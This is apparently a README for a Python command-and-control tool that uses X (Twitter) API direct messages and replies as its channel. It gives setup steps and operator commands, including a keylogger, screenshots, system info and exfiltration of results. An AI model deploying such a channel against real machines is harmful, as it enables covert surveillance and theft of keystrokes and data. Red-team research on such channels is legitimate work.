# XC2
Simple demonstration of using X (twitter) new API as a C2

# Price Limitation

With this new API, you need to have a basic plan to be able to use this project 😭
![image](https://github.com/user-attachments/assets/fc70f59b-c8fb-43d5-a43b-796be250fe2f)

# Requirements
- Python 3.8+
- Libraries: tweepy, cryptography, Pillow, pynput
- Twitter API v2 credentials (Bearer Token, API Key, etc.)

## Setup
- Install Dependencies: `pip install tweepy cryptography Pillow pynput`
- Configure Credentials:
  - Replace placeholders in c2_server.py and c2_client.py with your Twitter API credentials.
  - Share the encryption key (key) between server and client.
# Usage
- Run Server:
  - python server.py
- Run Client:
  - python client.py

## Shell-Like Interaction examples
- C2> `sysinfo`
  - Logs show responses like: Response from <client_id>: {'o': 'Windows', 'h': 'HOST1', 'i': '192.168.1.10'}
  - Target a specific client (replace <client_id> with actual ID from logs):
- C2> `target:<client_id> screenshot`
  - Logs show chunked screenshot data.
- Start keylogger on all clients:
  - C2> `keylogger_start`
  - Logs show keystrokes every 10 keys (e.g., Response from <client_id>: "hello[SPACE]world").
- View Responses:
  - Check server logs for real-time exfiltration from DMs or tweet replies.
- Additional Commands
  - whoami: Get client username.
  - get_memory key=last_dir: Retrieve in-memory data.
